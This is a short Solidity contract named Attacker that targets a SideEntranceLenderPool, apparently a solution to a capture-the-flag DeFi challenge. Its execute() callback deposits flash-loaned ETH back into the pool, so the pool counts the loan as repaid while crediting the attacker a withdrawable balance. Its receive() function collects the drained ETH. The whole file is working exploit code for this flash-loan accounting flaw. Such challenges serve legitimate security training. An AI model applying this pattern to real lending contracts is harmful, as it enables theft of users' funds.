
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {
    IFlashLoanEtherReceiver,
    SideEntranceLenderPool
} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    // Called by the pool during the flash loan
    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    // Accepts ETH when the pool sends the withdrawal
    receive() external payable {}
}
